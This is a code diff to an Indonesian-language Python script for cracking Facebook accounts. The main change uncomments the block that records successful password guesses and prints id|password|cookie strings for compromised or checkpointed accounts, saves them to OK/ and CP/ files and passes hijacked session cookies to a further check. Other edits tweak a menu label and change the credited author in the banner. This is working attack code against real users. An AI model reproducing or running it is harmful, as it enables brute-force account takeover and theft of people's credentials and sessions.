@@ -576,7 +576,7 @@ def crack_file():
 def setting():
 	print(f'{x}>> 1. Akun Old ')
 	print('>> 2. Akun New ')
-	print(' 3. Akun Random')
+	print('>> 3. Akun Random')
 	hu = input('>> Pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -813,28 +813,28 @@ def crackfree(idf,pwv):
 			time.sleep(1)
 	loop+=1
 
-#			if "checkpoint" in po.cookies.get_dict().keys():
-#				print(f'\r{K}>> {idf}|{pw}{N}')     
-#				os.popen('play-audio .cp.mp3')
-#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-#				akun.append(idf+'|'+pw)
-#				cp+=1
-#				break
-#			elif "c_user" in ses.cookies.get_dict().keys():
-#				ok+=1
-#				coki=po.cookies.get_dict()
-#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
-#				os.popen('play-audio .ok.mp3')
-#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-#				cek_apk(session,coki)
-#				break
-#				
-#			else:
-#				continue
-#		except requests.exceptions.ConnectionError:
-#			time.sleep(31)
-#	loop+=1
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r{K}>> {idf}|{pw}{N}')     
+				os.popen('play-audio .cp.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
+				os.popen('play-audio .ok.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(session,coki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 
 #---------------------[ METHODE-TOUCH-3 ]---------------------#
 def cracktouch(idf,pwv):
@@ -1124,8 +1124,8 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}Alvino Sehat Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang{x}')
-	time.sleep(3)
+	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}ikiwz Sehat Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang{x}')
+	time.sleep(2)
 	login()
 
 #>>>>> THANKS TO THIS HERE <<<<<<<#
